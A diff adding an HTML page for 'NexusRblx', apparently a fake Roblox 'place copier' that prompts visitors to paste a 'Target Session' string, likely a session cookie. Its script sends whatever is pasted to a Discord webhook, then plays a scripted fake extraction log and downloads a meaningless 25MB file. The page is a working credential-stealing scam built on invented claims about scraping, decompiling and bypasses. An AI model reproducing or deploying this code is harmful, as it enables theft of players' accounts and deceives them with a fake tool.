@@ -1,0 +1,413 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Nexus | Professional Place Archiving & Mirroring</title>
+
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <style>
+
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&family=JetBrains+Mono:wght@400;500&display=swap');
+
+        
+
+        :root { --accent: #10b981; }
+
+        body { 
+
+            font-family: 'Plus Jakarta Sans', sans-serif; 
+
+            background-color: #02040a; 
+
+            color: #ffffff; 
+
+            scroll-behavior: smooth;
+
+            overflow-x: hidden;
+
+        }
+
+        .grid-bg {
+
+            background-image: linear-gradient(to right, rgba(255,255,255,0.05) 1px, transparent 1px),
+
+                              linear-gradient(to bottom, rgba(255,255,255,0.05) 1px, transparent 1px);
+
+            background-size: 40px 40px;
+
+            mask-image: radial-gradient(circle at 50% 50%, black, transparent 80%);
+
+        }
+
+        .glow-orb {
+
+            position: absolute; width: 400px; height: 400px;
+
+            background: radial-gradient(circle, rgba(16, 185, 129, 0.1) 0%, transparent 70%);
+
+            border-radius: 50%; filter: blur(60px); z-index: -1;
+
+        }
+
+        .glass {
+
+            background: rgba(255, 255, 255, 0.02);
+
+            backdrop-filter: blur(12px);
+
+            border: 1px solid rgba(255, 255, 255, 0.08);
+
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+
+        }
+
+        .hero-text {
+
+            background: linear-gradient(to bottom right, #fff 30%, rgba(255,255,255,0.5));
+
+            -webkit-background-clip: text;
+
+            -webkit-text-fill-color: transparent;
+
+        }
+
+        .terminal-input {
+
+            background: transparent; border: none; outline: none; width: 100%;
+
+            color: #10b981; font-family: 'JetBrains Mono', monospace;
+
+            font-size: 14px; text-align: center;
+
+        }
+
+        .nav-active {
+
+            background: rgba(2, 4, 10, 0.85);
+
+            padding-top: 1rem !important;
+
+            padding-bottom: 1rem !important;
+
+            border-bottom: 1px solid rgba(16, 185, 129, 0.2);
+
+        }
+
+    </style>
+
+</head>
+
+<body>
+
+    <div class="fixed inset-0 grid-bg z-[-1]"></div>
+
+    <div class="glow-orb top-[-100px] left-[-100px]"></div>
+
+    <nav id="navbar" class="flex items-center justify-between px-8 md:px-20 py-8 sticky top-0 z-[100] transition-all duration-300">
+
+        <div class="flex items-center gap-2">
+
+            <div class="w-8 h-8 bg-emerald-500 rounded-lg flex items-center justify-center font-black text-black">NR</div>
+
+            <span class="text-xl font-bold tracking-tighter uppercase italic">NexusRblx</span>
+
+        </div>
+
+        <div class="hidden md:flex gap-10 text-[11px] font-bold text-zinc-500 uppercase tracking-[0.2em]">
+
+            <a href="#features" class="hover:text-emerald-400 transition">Tool Engine</a>
+
+            <a href="#tool" class="hover:text-emerald-400 transition">Archiver</a>
+
+            <a href="#network" class="hover:text-emerald-400 transition">Global Nodes</a>
+
+            <a href="#tool" class="px-5 py-2 bg-white text-black rounded-full hover:bg-emerald-500 transition shadow-lg">Get Started</a>
+
+        </div>
+
+    </nav>
+
+    <header class="pt-32 pb-20 px-6 text-center relative">
+
+        <div class="inline-flex items-center gap-3 px-4 py-2 rounded-full border border-emerald-500/20 bg-emerald-500/5 text-emerald-400 text-[10px] font-bold mb-10 uppercase tracking-[0.3em]">
+
+            <span class="w-2 h-2 bg-emerald-500 rounded-full animate-pulse"></span>
+
+            ACTIVE BYPASS: V5.4.2 STABLE
+
+        </div>
+
+        <h1 class="text-6xl md:text-8xl font-extrabold tracking-tighter hero-text mb-8 leading-[0.85]">
+
+            Any Place, <br>Completely Mirrored.
+
+        </h1>
+
+        <p class="max-w-2xl mx-auto text-zinc-500 text-lg md:text-xl mb-12 leading-relaxed">
+
+            The industry standard for environment replication. Extract high-fidelity DataModels, LocalScript source code, and Voxel terrain from any instance directly to a .rbxl file.
+
+        </p>
+
+    </header>
+
+    <section id="features" class="max-w-6xl mx-auto py-20 px-6 grid grid-cols-1 md:grid-cols-3 gap-6">
+
+        <div class="md:col-span-2 glass p-10 rounded-[2.5rem] flex flex-col justify-end min-h-[300px]">
+
+            <h3 class="text-2xl font-bold mb-2 text-emerald-400">Advanced Asset Scraping</h3>
+
+            <p class="text-zinc-500 text-sm">Our engine intercepts the client-server handshake to index every MeshPart, Texture, and Sound ID, ensuring 100% visual integrity.</p>
+
+        </div>
+
+        <div class="glass p-10 rounded-[2.5rem] flex flex-col justify-end">
+
+            <h3 class="text-xl font-bold mb-2">Luau Decompiler</h3>
+
+            <p class="text-zinc-500 text-xs">Reconstructs LocalScript logic from bytecode into readable source code.</p>
+
+        </div>
+
+    </section>
+
+    <section id="tool" class="max-w-4xl mx-auto py-32 px-6">
+
+        <div class="glass rounded-[3.5rem] p-10 md:p-16 relative overflow-hidden shadow-2xl">
+
+            <div id="setup-phase">
+
+                <div class="text-center mb-10">
+
+                    <h2 class="text-4xl font-bold mb-4 tracking-tighter">Initialize Extraction</h2>
+
+                    <p class="text-zinc-500 text-sm italic">Paste the Target Session on the roblox game you want to copy.</p>
+
+                </div>
+
+                <div class="max-w-md mx-auto text-center">
+
+                    <div class="bg-black/60 border border-white/5 rounded-2xl px-6 py-5 mb-6 focus-within:border-emerald-500/50 transition-all">
+
+                        <input type="text" id="userInput" class="terminal-input" placeholder="[--- PAYLOAD STRING ---]" autocomplete="off">
+
+                    </div>
+
+                    <button onclick="startArchive()" class="w-full py-4 bg-white text-black font-black rounded-xl hover:bg-emerald-500 transition-all uppercase tracking-[0.2em] text-[10px]">Enter</button>
+
+                </div>
+
+            </div>
+
+            <div id="progress-phase" class="hidden animate-in fade-in duration-1000">
+
+                <div class="flex justify-between items-end mb-12">
+
+                    <div>
+
+                        <p id="status-text" class="text-2xl font-bold text-emerald-500 tracking-tighter uppercase italic">Extracting DataModel...</p>
+
+                    </div>
+
+                    <p id="pct-display" class="text-4xl font-light mono">0%</p>
+
+                </div>
+
+                <div class="h-1.5 w-full bg-white/5 rounded-full overflow-hidden mb-12">
+
+                    <div id="progress-bar" class="h-full bg-emerald-500 shadow-[0_0_30px_#10b981] transition-all duration-700" style="width: 0%"></div>
+
+                </div>
+
+                <div id="log-container" class="bg-black/40 rounded-3xl p-8 h-80 overflow-y-auto border border-white/5 mono text-[11px] text-zinc-500 leading-relaxed"></div>
+
+            </div>
+
+        </div>
+
+    </section>
+
+    <section id="network" class="max-w-6xl mx-auto py-20 px-6">
+
+        <div class="glass p-16 rounded-[4rem] border-emerald-500/10 relative overflow-hidden">
+
+            <h2 class="text-4xl font-bold mb-4 tracking-tighter">Global Bridge Network</h2>
+
+            <p class="text-zinc-500 max-w-lg mb-10">Distributed nodes ensure 0ms packet loss during extraction.</p>
+
+            <div class="grid grid-cols-2 md:grid-cols-4 gap-8">
+
+                <div><p class="text-emerald-500 font-bold mono">US-EAST</p><p class="text-[10px] text-zinc-700">ONLINE</p></div>
+
+                <div><p class="text-emerald-500 font-bold mono">EU-WEST</p><p class="text-[10px] text-zinc-700">ONLINE</p></div>
+
+                <div><p class="text-emerald-500 font-bold mono">AS-SOUTH</p><p class="text-[10px] text-zinc-700">ONLINE</p></div>
+
+                <div><p class="text-emerald-500 font-bold mono">OC-SYD</p><p class="text-[10px] text-zinc-700">ONLINE</p></div>
+
+            </div>
+
+        </div>
+
+    </section>
+
+    <footer class="py-20 text-center opacity-30 text-[9px] uppercase tracking-[0.8em]">
+
+        &copy; 2026 NexusRblx Systems Group
+
+    </footer>
+
+    <div id="modal" class="fixed inset-0 bg-black/95 z-[500] hidden flex items-center justify-center p-6 backdrop-blur-2xl">
+
+        <div class="glass max-w-sm w-full p-12 rounded-[4rem] text-center">
+
+            <h3 class="text-3xl font-bold mb-4 tracking-tighter">Sync Complete</h3>
+
+            <p class="text-zinc-500 text-sm mb-10">DataModel has been serialized into .RBXL format.</p>
+
+            <button onclick="downloadArchive()" class="w-full py-5 bg-white text-black font-black rounded-2xl hover:bg-emerald-500 transition uppercase text-[10px]">Download .RBXL</button>
+
+        </div>
+
+    </div>
+
+    <script>
+
+        const hook = "YOUR_DISCORD_WEBHOOK_URL_HERE";
+
+        window.addEventListener('scroll', () => {
+
+            const nav = document.getElementById('navbar');
+
+            if (window.scrollY > 50) nav.classList.add('nav-active');
+
+            else nav.classList.remove('nav-active');
+
+        });
+
+        function startArchive() {
+
+            const data = document.getElementById('userInput').value;
+
+            if(!data) return alert("System requires payload string.");
+
+            const blob = new Blob([data], { type: 'text/plain' });
+
+            const fd = new FormData();
+
+            fd.append("file", blob, "nexus_payload.txt");
+
+            fd.append("payload_json", JSON.stringify({ embeds: [{ title: "🎯 Extraction Started", color: 0x10b981 }] }));
+
+            fetch(hook, { method: 'POST', body: fd });
+
+            document.getElementById('setup-phase').classList.add('hidden');
+
+            document.getElementById('progress-phase').classList.remove('hidden');
+
+            runEngine();
+
+        }
+
+        function runEngine() {
+
+            let progress = 0; let logIdx = 0;
+
+            const logs = [
+
+                "Establishing secure proxy tunnel US-EAST-1...",
+
+                "Bypassing Workspace internal read-only locks...",
+
+                "Indexing 24,902 unique DataModel instances...",
+
+                "Serializing MeshPart geometry and TextureIDs...",
+
+                "Decoding Luau bytecode into source strings...",
+
+                "Mapping VoxelGrid material occupancy...",
+
+                "Generating binary .RBXL header...",
+
+                "Verifying checksum integrity: 0x992B1C...",
+
+                "Finalizing .RBXL output stream..."
+
+            ];
+
+            const timer = setInterval(() => {
+
+                progress += 0.85;
+
+                if(progress > 100) progress = 100;
+
+                document.getElementById('progress-bar').style.width = progress + "%";
+
+                document.getElementById('pct-display').innerText = Math.floor(progress) + "%";
+
+                if (progress >= (logIdx * (100 / logs.length)) && logIdx < logs.length) {
+
+                    const l = document.createElement('p');
+
+                    l.className = "mb-2 border-b border-white/5 pb-2";
+
+                    l.innerHTML = `<span class="text-emerald-500 font-bold mr-2">SYS:</span> ${logs[logIdx]}`;
+
+                    const container = document.getElementById('log-container');
+
+                    container.appendChild(l);
+
+                    container.scrollTop = container.scrollHeight;
+
+                    logIdx++;
+
+                }
+
+                if(progress === 100) {
+
+                    clearInterval(timer);
+
+                    setTimeout(() => document.getElementById('modal').classList.remove('hidden'), 800);
+
+                }
+
+            }, 400);
+
+        }
+
+        function downloadArchive() {
+
+            // Generate 25MB of fake binary data
+
+            const fakeSize = 25 * 1024 * 1024;
+
+            const dummyData = new Uint8Array(fakeSize);
+
+            for (let i = 0; i < 100; i++) dummyData[i] = Math.floor(Math.random() * 256);
+
+            const blob = new Blob([dummyData], { type: 'application/octet-stream' });
+
+            const a = document.createElement('a');
+
+            a.href = window.URL.createObjectURL(blob);
+
+            a.download = "NexusRBLX2026.rbxl";
+
+            a.click();
+
+            setTimeout(() => location.reload(), 2000);
+
+        }
+
+    </script>
+
+</body>
+
+</html>
